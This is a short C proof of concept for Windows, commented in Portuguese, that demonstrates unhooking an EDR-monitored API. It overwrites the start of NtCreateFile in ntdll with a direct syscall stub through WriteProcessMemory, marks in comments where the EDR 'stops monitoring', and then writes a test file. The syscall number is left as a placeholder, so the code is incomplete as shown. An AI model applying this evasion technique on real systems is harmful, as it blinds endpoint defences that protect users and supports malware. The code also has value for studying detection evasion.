// Use Visual Studio

#include <Windows.h>
#include <stdio.h>
#include "winternl.h"
#pragma comment(lib, "ntdll")

#define NT_SUCCESS(x) ((x) >= 0)

typedef NTSTATUS(WINAPI* SysNtCreateFile)(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize,
	ULONG FileAttributes,
	ULONG ShareAccess,
	ULONG CreateDisposition,
	ULONG CreateOptions,
	PVOID EaBuffer,
	ULONG EaLength
	);

//==================================[EDR está monitorando]=================================
int main()
{
	HMODULE ntdll = GetModuleHandleA("ntdll");
	SysNtCreateFile NtCreateFile = (SysNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
	if (NtCreateFile == NULL) {
		puts("[-] Nao foi possivel obter o endereço da função NtCreateFile");
		return 1;
	}

	HANDLE currentProc = GetCurrentProcess();
	//=============================[EDR está monitorando até aqui]=============================

	WriteProcessMemory(currentProc, NtCreateFile, "\x4C\x8B\xD1\xB8\x<SYSCALL HERE>", 6, NULL); // NTAPI desengatada


	//=============================[EDR não está monitorando mais]=============================
	HANDLE fileHandle;
	OBJECT_ATTRIBUTES objectAttributes;
	IO_STATUS_BLOCK ioStatusBlock;
	UNICODE_STRING fileName;

	RtlInitUnicodeString(&fileName, L"\\??\\C:\\Users\\Public\\openme.txt");
	InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NTSTATUS status;
	if (!NT_SUCCESS(status = NtCreateFile(
		&fileHandle,
		FILE_GENERIC_WRITE,
		&objectAttributes,
		&ioStatusBlock,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_WRITE,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0))) {
		puts("[-] Nao foi possivel criar o arquivo");
	}
	else {
		puts("[+] Arquivo criado");
	}
	return 0;
}